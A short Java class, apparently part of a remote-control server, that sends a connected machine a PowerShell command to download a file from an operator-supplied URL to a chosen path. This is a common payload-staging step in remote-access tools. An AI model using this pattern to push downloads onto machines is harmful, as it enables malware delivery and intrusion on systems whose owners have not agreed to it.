package nettyTest.server.commands;

import nettyTest.server.Connection;
import nettyTest.server.Data;

import java.io.UnsupportedEncodingException;

public class UploadPowershell {
    public static void run(String arg1, String arg2, Connection connection) throws UnsupportedEncodingException, InterruptedException {
        connection.send("(New-Object Net.WebClient).DownloadFile('"+arg1+"', '"+arg2+"')" + "\n");
    }
}
